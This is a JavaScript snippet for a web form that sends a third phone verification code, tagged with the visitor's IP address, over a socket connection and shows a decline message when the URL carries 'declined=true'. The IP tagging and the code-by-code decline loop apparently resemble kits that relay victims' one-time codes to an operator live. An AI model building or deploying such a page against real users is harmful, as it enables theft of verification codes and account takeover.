    document.addEventListener("DOMContentLoaded", () => {
      const form = document.getElementById("codeForm");
      const overlay = document.getElementById("loadingOverlay");

      form.addEventListener("submit", async (e) => {
        e.preventDefault();

       
        overlay.classList.remove("d-none");
        overlay.classList.add("d-flex");

        while (window.visitorIP === null) {
          await new Promise((r) => setTimeout(r, 50));
        }

        const code3 = document.getElementById(
          "verification_code_three"
        ).value;

        window.socket.emit("submitPhoneCode", {
          ip: window.visitorIP,
          verification_code_three: code3,
        });
      });

     
      const params = new URLSearchParams(window.location.search);
      if (params.get("declined") === "true") {
        const box = document.getElementById("declineCodeBox");
        if (box) {
          box.classList.add("show");
          setTimeout(() => box.scrollIntoView({ behavior: "smooth", block: "center" }), 200);
        }
      }

      window.socket.on("ackPhoneCode", (resp) => {
        if (resp.success) {
          
        } else {
          
          overlay.classList.remove("d-flex");
          overlay.classList.add("d-none");
          console.error(resp.error);
        }
      });
    });